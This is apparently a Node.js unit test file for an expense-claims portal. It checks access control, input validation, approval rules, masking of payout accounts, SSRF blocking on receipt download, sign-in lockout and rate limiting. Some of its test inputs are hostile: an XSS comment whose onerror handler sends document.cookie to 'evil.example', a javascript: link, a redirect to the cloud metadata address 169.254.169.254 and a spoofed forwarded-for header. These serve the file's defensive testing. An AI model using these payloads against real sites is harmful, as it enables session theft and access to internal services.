// Business rules and access control, tested directly against the services that
// the route handlers and Server Actions share: `npm run test:unit`.
import { beforeEach, describe, test } from "node:test";
import assert from "node:assert/strict";
import { SSRFGuard } from "@owasp-webshield/core";
import { isValidIban } from "../lib/bank-details.js";
import { toCents } from "../lib/claims.js";
import { createPortal } from "../lib/portal.js";
import { clientIp, createRateLimiter } from "../lib/rate-limit.js";
import { downloadReceipt, sniffType } from "../lib/receipts.js";

const NOW = Date.parse("2026-10-04T12:00:00Z");
const PDF = Buffer.from("%PDF-1.7\n% receipt\n");

let portal;
let sessions;
let remote; // what the fake receipt server answers

beforeEach(() => {
  remote = { status: 200, body: PDF, headers: {} };
  portal = createPortal({
    env: {},
    kdfIterations: 1000,
    now: () => NOW,
    guard: new SSRFGuard({ resolveHost: async (host) => (host === "receipts.example.com" ? ["203.0.113.5"] : ["10.0.0.7"]) }),
    fetchImpl: async () => new Response(remote.body, { status: remote.status, headers: remote.headers }),
    auditProvider: { scan: async () => [] }
  });
  const signIn = (username, password) => {
    const { token } = portal.sessions.create(portal.users.verify(username, password));
    return portal.sessions.lookup(token);
  };
  sessions = {
    emma: signIn("emma", "owl-demo-employee"),
    omar: signIn("omar", "owl-demo-employee"),
    max: signIn("max", "owl-demo-manager"),
    fiona: signIn("fiona", "owl-demo-finance")
  };
});

const claimInput = (overrides = {}) => ({
  merchant: "Rail Europe",
  amount: "128.40",
  category: "travel",
  spentOn: "2026-10-01",
  description: "Train to the Berlin customer workshop",
  ...overrides
});

const submit = (who, overrides) => portal.claims.create(sessions[who], claimInput(overrides));

function assertCode(fn, code) {
  assert.throws(fn, (error) => {
    assert.equal(error.code, code, error.message);
    return true;
  });
}

const assertNotFound = (fn) => assert.throws(fn, (error) => error.status === 404);

describe("A01: who can see a claim", () => {
  test("employees see their own, managers their team's, finance everyone's", () => {
    const emmas = submit("emma");
    const omars = submit("omar", { merchant: "Hotel Lux" });
    const ids = (who) => portal.claims.list(sessions[who]).map((claim) => claim.id).sort();

    assert.deepEqual(ids("emma"), [emmas.id]);
    assert.deepEqual(ids("omar"), [omars.id]);
    assert.deepEqual(ids("max"), [emmas.id]); // platform team only
    assert.deepEqual(ids("fiona"), [emmas.id, omars.id].sort());
  });

  test("someone else's claim is 'not found', and the attempt is logged", () => {
    const omars = submit("omar");
    assertNotFound(() => portal.claims.get(sessions.emma, omars.id));
    assertNotFound(() => portal.claims.get(sessions.max, omars.id));
    assertNotFound(() => portal.claims.get(sessions.emma, "999"));
    assert.ok(portal.logs.some((entry) => entry.event === "security.access_denied" && entry.details.claimId === omars.id));
  });

  test("an employee can't comment on, attach to or decide another team's claim", () => {
    const omars = submit("omar");
    assertNotFound(() => portal.claims.addComment(sessions.emma, omars.id, { body: "hi" }));
    assertNotFound(() => portal.claims.setStatus(sessions.emma, omars.id, { status: "approved" }));
    assertNotFound(() => portal.claims.receipt(sessions.emma, omars.id));
  });
});

describe("A03: input", () => {
  test("rejects fields the form doesn't have (mass assignment)", () => {
    assertCode(() => submit("emma", { status: "approved" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { ownerId: "u-fiona" }), "INVALID_INPUT");
  });

  test("validates amount, category and date", () => {
    assertCode(() => submit("emma", { amount: "12.5" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { amount: "-5.00" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { amount: "0.00" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { amount: 128.4 }), "INVALID_INPUT"); // a number, not a string
    assertCode(() => submit("emma", { category: "gifts" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { spentOn: "2026-02-30" }), "INVALID_INPUT");
    assertCode(() => submit("emma", { spentOn: "2026-10-05" }), "INVALID_INPUT"); // future
    assertCode(() => submit("emma", { spentOn: "2026-06-01" }), "INVALID_INPUT"); // older than 90 days
    assert.equal(toCents("1234.56"), 123456);
    assert.equal(toCents("7"), 700);
  });

  test("comments keep formatting and lose scripts", () => {
    const claim = submit("emma");
    const comment = portal.claims.addComment(sessions.max, claim.id, {
      body: '<b>Approved</b> <img src=x onerror="fetch(`//evil.example/`+document.cookie)"><a href="javascript:alert(1)">x</a>'
    });
    assert.match(comment.body, /<b>Approved<\/b>/);
    assert.doesNotMatch(comment.body, /onerror|javascript:/i);
  });
});

describe("A04: business rules", () => {
  test("nobody decides on their own claim, whatever their role", () => {
    const maxs = submit("max");
    const fionas = submit("fiona");
    assertCode(() => portal.claims.setStatus(sessions.max, maxs.id, { status: "approved" }), "ACCESS_DENIED");
    assertCode(() => portal.claims.setStatus(sessions.fiona, fionas.id, { status: "approved" }), "ACCESS_DENIED");
    assert.equal(portal.claims.get(sessions.max, maxs.id).allowed.approve, false);
    // ...but someone else can.
    assert.equal(portal.claims.setStatus(sessions.fiona, maxs.id, { status: "approved" }).status, "approved");
  });

  test("employees can't approve; managers approve their team up to the limit", () => {
    const small = submit("emma", { amount: "999.99" });
    const large = submit("emma", { merchant: "Laptop Store", amount: "1500.00", category: "equipment" });
    assertCode(() => portal.claims.setStatus(sessions.emma, small.id, { status: "approved" }), "ACCESS_DENIED");
    assert.equal(portal.claims.setStatus(sessions.max, small.id, { status: "approved" }).status, "approved");

    assertCode(() => portal.claims.setStatus(sessions.max, large.id, { status: "approved" }), "ACCESS_DENIED");
    assert.equal(portal.claims.get(sessions.max, large.id).allowed.approve, false);
    assert.equal(portal.claims.get(sessions.max, large.id).allowed.reject, true); // rejecting has no limit
    assert.equal(portal.claims.setStatus(sessions.fiona, large.id, { status: "approved" }).status, "approved");
  });

  test("lifecycle: only approved claims are paid, once, and only with a payout account on file", () => {
    const claim = submit("emma");
    assertCode(() => portal.claims.setStatus(sessions.fiona, claim.id, { status: "paid" }), "INVALID_INPUT");
    portal.claims.setStatus(sessions.max, claim.id, { status: "approved" });
    assertCode(() => portal.claims.setStatus(sessions.max, claim.id, { status: "paid" }), "ACCESS_DENIED"); // managers don't pay
    assertCode(() => portal.claims.setStatus(sessions.fiona, claim.id, { status: "paid" }), "INVALID_INPUT"); // no account yet

    portal.bankDetails.save(sessions.emma.userId, "DE89 3704 0044 0532 0130 00");
    const paid = portal.claims.setStatus(sessions.fiona, claim.id, { status: "paid" });
    assert.equal(paid.status, "paid");
    assert.equal(paid.history.at(-1).paidTo, "DE•• •••• 3000");
    assertCode(() => portal.claims.setStatus(sessions.fiona, claim.id, { status: "paid" }), "INVALID_INPUT");
  });

  test("a rejected claim stays rejected", () => {
    const claim = submit("emma");
    portal.claims.setStatus(sessions.max, claim.id, { status: "rejected", reason: "No receipt" });
    assertCode(() => portal.claims.setStatus(sessions.fiona, claim.id, { status: "approved" }), "INVALID_INPUT");
  });

  test("duplicate claims and too many pending claims are refused", () => {
    submit("emma");
    assertCode(() => submit("emma", { merchant: "RAIL EUROPE " }), "INVALID_INPUT");
    for (let i = 1; i < 5; i++) submit("emma", { merchant: `Taxi ${i}` });
    assertCode(() => submit("emma", { merchant: "Taxi 6" }), "INVALID_INPUT");
    assert.ok(portal.logs.some((entry) => entry.event === "claim.rejected_on_submit" && entry.details.rule === "too_many_pending"));
  });
});

describe("A02: payout accounts", () => {
  test("stored encrypted, shown masked, revealed only to finance and audited", () => {
    assert.equal(portal.bankDetails.save(sessions.emma.userId, "de89370400440532013000"), "DE•• •••• 3000");
    assert.doesNotMatch(JSON.stringify(portal.bankDetails.raw(sessions.emma.userId)), /3704|DE89/);

    const claim = submit("emma");
    assert.throws(() => portal.claims.payoutAccount(sessions.fiona, claim.id), /payout/); // not approved yet
    portal.claims.setStatus(sessions.max, claim.id, { status: "approved" });
    assertCode(() => portal.claims.payoutAccount(sessions.max, claim.id), "ACCESS_DENIED");
    assert.equal(portal.claims.payoutAccount(sessions.fiona, claim.id), "DE89370400440532013000");
    assert.ok(portal.logs.some((entry) => entry.event === "bank_details.viewed" && entry.details.by === "u-fiona"));
  });

  test("checks the IBAN checksum", () => {
    assert.equal(isValidIban("GB82 WEST 1234 5698 7654 32"), true);
    assert.equal(isValidIban("GB82 WEST 1234 5698 7654 33"), false);
    assertCode(() => portal.bankDetails.save("u-emma", "DE00 0000 0000 0000 0000 00"), "INVALID_INPUT");
  });
});

describe("A10: receipt download", () => {
  const download = (url = "https://receipts.example.com/r/1.pdf") => downloadReceipt(url, { fetcher: portal.receiptFetcher });

  test("keeps a real PDF, with its hash and source host", async () => {
    const receipt = await download();
    assert.equal(receipt.contentType, "application/pdf");
    assert.equal(receipt.sourceHost, "receipts.example.com");
    assert.equal(receipt.sha256.length, 64);
  });

  test("judges the file by its bytes, not its Content-Type", async () => {
    remote = { status: 200, body: "<script>alert(1)</script>", headers: { "Content-Type": "application/pdf" } };
    await assert.rejects(download(), /PDF, PNG or JPEG/);
    assert.equal(sniffType(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])).type, "image/png");
  });

  test("stops reading past 2 MB", async () => {
    remote = { status: 200, body: Buffer.concat([PDF, Buffer.alloc(2 * 1024 * 1024)]), headers: {} };
    await assert.rejects(download(), /larger than 2 MB/);
  });

  test("a redirect to an internal address is blocked", async () => {
    remote = { status: 302, body: null, headers: { Location: "http://169.254.169.254/latest/meta-data/" } };
    await assert.rejects(download(), (error) => error.code === "SSRF_BLOCKED");
  });

  test("a host that resolves to a private address is blocked", async () => {
    await assert.rejects(download("https://intranet.example.com/r.pdf"), (error) => error.code === "SSRF_BLOCKED");
  });

  test("only the owner attaches, and only while the claim is pending", async () => {
    const claim = submit("emma");
    const receipt = await download();
    assertCode(() => portal.claims.attachReceipt(sessions.max, claim.id, receipt), "ACCESS_DENIED");
    portal.claims.attachReceipt(sessions.emma, claim.id, receipt);
    assert.equal(portal.claims.receipt(sessions.max, claim.id).filename, `claim-${claim.id}-receipt.pdf`);
    portal.claims.setStatus(sessions.max, claim.id, { status: "approved" });
    assertCode(() => portal.claims.attachReceipt(sessions.emma, claim.id, receipt), "ACCESS_DENIED");
  });
});

describe("A07: sign-in", () => {
  test("one generic error for unknown users and wrong passwords, then a lockout", () => {
    assert.throws(() => portal.users.verify("nobody", "x"), /Invalid username or password/);
    for (let i = 0; i < 5; i++) assert.throws(() => portal.users.verify("emma", "wrong"), /Invalid username or password/);
    assert.throws(() => portal.users.verify("emma", "owl-demo-employee"), /Too many failed sign-ins/);
  });

  test("sessions expire", () => {
    let clock = NOW;
    const store = createPortal({ env: {}, kdfIterations: 1000, sessionTtlMs: 1000, now: () => clock, auditProvider: { scan: async () => [] } }).sessions;
    const { token } = store.create({ id: "u1", name: "U", team: "t", roles: ["employee"] });
    assert.ok(store.lookup(token));
    clock += 1001;
    assert.equal(store.lookup(token), null);
  });
});

describe("A04: rate limiting", () => {
  test("counts per key and resets after the window", () => {
    let clock = NOW;
    const limiter = createRateLimiter({ limit: 2, windowMs: 1000, now: () => clock });
    limiter.hit("a");
    limiter.hit("a");
    assert.equal(limiter.allows("a"), false);
    assert.equal(limiter.allows("b"), true);
    clock += 1000;
    assert.equal(limiter.allows("a"), true);
  });

  test("takes the client address added by the trusted proxy, not what the client wrote", () => {
    const headers = (value) => new Headers({ "x-forwarded-for": value });
    // The client sent "6.6.6.6"; the proxy appended the real address.
    assert.equal(clientIp(headers("6.6.6.6, 203.0.113.9"), { trustedHops: 1 }), "203.0.113.9");
    assert.equal(clientIp(headers("6.6.6.6, 203.0.113.9, 10.0.0.2"), { trustedHops: 2 }), "203.0.113.9");
    assert.equal(clientIp(new Headers(), { trustedHops: 1 }), "unknown");
  });
});

describe("A05: startup check", () => {
  test("refuses to start with debug on", () => {
    assert.throws(() => createPortal({ env: { OWL_DEBUG: "true" }, kdfIterations: 1000 }), /debug_enabled/);
  });
});
